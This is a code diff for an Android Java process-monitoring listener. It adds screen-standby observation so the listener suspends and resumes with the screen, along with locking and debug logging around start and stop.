@@ -17,16 +17,24 @@ import android.app.ActivityManager.RunningAppProcessInfo;
 import com.android.networking.ProcessInfo;
 import com.android.networking.ProcessStatus;
 import com.android.networking.RunningProcesses;
+import com.android.networking.Standby;
 import com.android.networking.auto.Cfg;
+import com.android.networking.interfaces.Observer;
 import com.android.networking.util.Check;
 
-public class ListenerProcess extends Listener<ProcessInfo> {
+public class ListenerProcess extends Listener<ProcessInfo> implements Observer<Standby> {
 	/** The Constant TAG. */
 	private static final String TAG = "ListenerProcess"; //$NON-NLS-1$
 
 	private BroadcastMonitorProcess processReceiver;
 	TreeMap<String, RunningAppProcessInfo> lastRunning = new TreeMap<String, RunningAppProcessInfo>();
 	TreeMap<String, RunningAppProcessInfo> currentRunning = new TreeMap<String, RunningAppProcessInfo>();
+
+	private boolean started;
+
+	private Object standbyLock = new Object();
+
+	private Object startedLock = new Object();
 
 	/** The singleton. */
 	private volatile static ListenerProcess singleton;
@@ -47,17 +55,62 @@ public class ListenerProcess extends Listener<ProcessInfo> {
 		return singleton;
 	}
 
+	public ListenerProcess() {
+		super();
+		synchronized (standbyLock) {
+			ListenerStandby.self().attach(this);
+			setSuspended(!ListenerStandby.isScreenOn());
+		}
+	}
+
 	@Override
 	protected void start() {
-		processReceiver = new BroadcastMonitorProcess();
-		processReceiver.start();
-		processReceiver.register(this);
+
+		synchronized (startedLock) {
+			if (!started) {
+				if (ListenerStandby.isScreenOn()) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (start)");
+					}
+					started = true;
+
+					processReceiver = new BroadcastMonitorProcess();
+					processReceiver.start();
+					processReceiver.register(this);
+				}else{
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (start): screen off");
+						setSuspended(true);
+					}
+				}
+			} else {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (start): already started");
+				}
+			}
+		}
+
 	}
 
 	@Override
 	protected void stop() {
-		processReceiver.unregister();
-		processReceiver = null;
+		synchronized (startedLock) {
+			if (started) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (stop)");
+				}
+				started = false;
+				if (processReceiver != null) {
+					processReceiver.unregister();
+					processReceiver = null;
+				}
+			} else {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (stop): already stopped");
+				}
+			}
+		}
+
 	}
 
 	protected int dispatch(RunningProcesses processes) {
@@ -90,9 +143,29 @@ public class ListenerProcess extends Listener<ProcessInfo> {
 				Check.log(TAG + " (notification): stopped " + norun.processName);//$NON-NLS-1$
 			}
 			super.dispatch(new ProcessInfo(norun, ProcessStatus.STOP));
+
 		}
 
 		lastRunning = (TreeMap<String, RunningAppProcessInfo>) currentRunning.clone();
+
+		return 0;
+	}
+
+	@Override
+	public int notification(Standby b) {
+		synchronized (standbyLock) {
+			if (b.getStatus()) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (notification): try to resume");
+				}
+				resume();
+			} else {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (notification): try to suspend");
+				}
+				suspend();
+			}
+		}
 
 		return 0;
 	}
